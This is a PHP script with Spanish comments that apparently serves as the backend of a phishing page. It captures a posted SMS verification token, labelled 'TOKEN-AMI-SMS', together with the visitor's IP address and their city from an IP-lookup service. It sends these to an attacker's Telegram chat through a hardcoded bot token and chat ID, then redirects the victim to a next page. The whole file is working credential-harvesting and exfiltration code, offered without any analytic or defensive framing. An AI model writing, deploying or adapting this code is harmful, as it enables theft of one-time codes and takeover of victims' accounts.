<?php
// Función para obtener la IP real del cliente
function obtenerIpCliente() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // IP compartida
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // IP pasada por un proxy
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]); // La primera IP es la del cliente real
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        // Último recurso: IP directa
        return $_SERVER['REMOTE_ADDR'];
    }
    return 'IP desconocida';
}

// Obtener la IP del cliente
$direccion_ip = obtenerIpCliente();

// Datos del formulario
$cas22 = $_POST['cas2'] ?? '';

// Obtener ciudad basada en la dirección IP
$ciudad = '';
if (!empty($direccion_ip)) {
    $ip_api_url = "http://ip-api.com/json/{$direccion_ip}?fields=city";
    $response = @file_get_contents($ip_api_url);
    if ($response !== false) {
        $json = json_decode($response, true);
        $ciudad = $json['city'] ?? '';
    }
}

// Token del bot y chat ID del canal
$botToken = '8147135146:AAFsK7Oh99mmfbqkecCcLUgLkWbJrazYT50';
$chatId = '7953434263'; // Puede ser el nombre o el ID numérico del canal

// Mensaje a enviar
$mensaje = "-TK1-:\n";
$mensaje .= "🌐 IP: <code>$direccion_ip</code>\n";
$mensaje .= "🔑 TOKEN-AMI-SMS: <code>$cas22</code>\n";
$mensaje .= "🏙 Ciu: <code>$ciudad</code>";

// URL de la API de Telegram para enviar mensajes
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

// Datos a enviar
$data = [
    'chat_id' => $chatId,
    'text' => $mensaje,
    'parse_mode' => 'HTML'
];

// Configurar la petición
$options = [
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($data)
    ]
];

// Crear un contexto
$context = stream_context_create($options);

// Enviar el mensaje a Telegram
$result = file_get_contents($telegramUrl, false, $context);

// Redireccionar
if ($result !== false) {
    header('Refresh: 2; URL=w2.html');
    exit;
}
?>
